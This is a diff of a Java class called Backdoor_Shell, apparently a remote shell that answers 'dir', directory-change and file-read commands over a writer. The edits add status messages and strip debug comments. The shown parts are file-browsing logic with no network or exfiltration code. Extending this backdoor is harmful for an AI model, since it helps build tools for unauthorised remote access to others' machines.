@@ -64,11 +64,13 @@ public class Backdoor_Shell {
 				}
 				
 				else if(cmd[0].equalsIgnoreCase("dir")){
-	
-					//File object with workingDir
-					//file.listFiles()
 					
 					File [] file = new File(workingDir).listFiles();
+					
+					String nameFile = new File(workingDir).getName();
+					
+					writer.write("\n\rList of content for Directory " +nameFile+":\n\r");
+					
 					
 					
 					int am = file.length;
@@ -127,24 +129,11 @@ public class Backdoor_Shell {
 								
 								if(tempWrkDir.getParentFile() == null)
 								{
-									//tempWrkDir = tempWrkDir;
-									//workingDir = workingDir;
-									//System.out.println("check");
+	
 									continue;
 								}
 								workingDir=tempWrkDir.getAbsolutePath();
-								/*wrkDir = prevDir;
-								
-								workingDir = previousDir;*/
-								
-								//STILL GOES TO THE BEGINING DIR
-								
-								//workingDir = tempWrkDir.getParent()
-								
-								//System.out.println("Check 2");
-								
-								//System.out.println("temp dirct: "+tempWrkDir);
-							//	System.out.println("work direct: "+workingDir);
+
 								
 								
 							}
@@ -155,7 +144,7 @@ public class Backdoor_Shell {
 								
 								workingDir = toBeginning;
 								
-								//System.out.println("Check 3");
+	
 								
 							}
 							else
@@ -166,7 +155,8 @@ public class Backdoor_Shell {
 									workingDir=tempDir.getAbsolutePath();
 								}
 								else {
-									writer.write(tempDir + " does not exists\n");
+									writer.write("\n\r");
+									writer.write("\rDirectory "+tempDir.getName() + " does not exists\n");
 								}
 							
 								
@@ -262,16 +252,6 @@ public class Backdoor_Shell {
 			{
 				
 				fil = new File(workingDir+"\\"+spi);
-				
-				//System.out.println(spi);
-				/*if(workingDir.contains("C:\\"))
-				{
-					fil = new File(workingDir+"\\"+spi);
-				}
-					else if(!(workingDir.contains("C:\\")))
-					{
-						fil = new File ("C:\\"+workingDir+"\\"+spi);
-					}*/
 			
 				 
 				writer.write("\n\r");
@@ -294,7 +274,8 @@ public class Backdoor_Shell {
 					}
 				else if(!fil.isFile())
 						{
-						writer.write("\n\r"+spi +" not found!\n"); //PRINTS ERROR AND STARTS AGAIN, BUT NOT WHEN YOU TYPE IN THE PROPER FILE NAME
+						//writer.write("\n\r");
+						writer.write("File "+spi +" not found!\n"); 
 						}
 		
 			}
